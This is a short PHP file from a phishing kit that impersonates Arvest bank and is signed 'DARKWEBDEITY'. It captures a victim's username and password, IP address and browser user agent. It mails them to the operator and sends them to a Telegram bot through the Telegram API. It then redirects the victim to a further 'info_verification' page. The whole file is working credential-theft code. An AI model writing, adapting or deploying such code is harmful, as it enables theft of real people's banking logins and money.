<?php
session_start();
include("settings.php");

// validate login
/*if(!isset($_POST['username']) || !isset($_POST['password'])) {
    header('Location: login.php');
    exit;
}*/

    //collect info
    $username = $_SESSION['username'];
    $password = $_POST['password'];

    $message="------ 😈😈 ARVEST BY DARKWEBDEITY 😈😈  ------\n";
    $message.="====== LOGIN INFO ========\n";
    $message.="Username: ".$username."\n";
    $message.="Password: ".$password."\n";
    $message.="IP ADDR: ".$_SERVER['REMOTE_ADDR']." \n";
    $message.="USER AGENT: ".$_SERVER['HTTP_USER_AGENT']." \n";
    $message.="==========================\n";

    //send email
    mail($mail, "Login Info", $message);

    //send telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$telegram_bot_token."/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$telegram_chat_id."&text=".$message);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

   
    header('Location: ../info_verification.php');
    exit;
   

